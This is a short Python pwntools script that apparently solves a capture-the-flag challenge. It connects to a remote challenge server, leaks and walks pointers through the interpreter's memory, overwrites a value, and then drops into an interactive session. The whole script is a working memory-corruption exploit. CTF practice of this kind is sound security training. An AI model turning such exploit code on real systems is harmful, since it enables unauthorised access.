#!/usr/bin/env python

from pwn import *
from string import printable

def nextMem(addr: bytes) -> bytes:
    return str(hex(int(addr, 16)+8)).encode()

def flip(addr: bytes):
    return b'0x' + b''.join(reversed([addr[i:i+2] for i in range(0, len(addr), 2)]))

def dereference(addr: bytes):
    io.sendlineafter(b'address: ', addr)
    return flip(io.recvline().strip()[20:36])

io = remote("pypwnonebyte.ept.gg", 1337, ssl=True)
#io = process("./source.py")

io.recvuntil(b'id=')
addr = io.recvline().strip()
addr = str(hex(int(addr, 16))).encode()

for i in range(6):
    addr = nextMem(addr)
addr = dereference(addr)

for i in range(7):
    addr = nextMem(addr)
addr = dereference(addr)
for i in range(5):
    addr = nextMem(addr)
addr = dereference(addr)
for i in range(2):
    addr = nextMem(addr)
print(dereference(addr))

io.sendlineafter(b': ', b'-0x1')
io.sendlineafter(b': ', addr)
io.sendlineafter(b': ', b'0x0')
"""
while True:
    for i in range(20):
        print(dereference(addr))
        addr = nextMem(addr)
    print()
    addr = input().encode()
    if addr == b'-0x1': break
"""

io.interactive()
io.close()
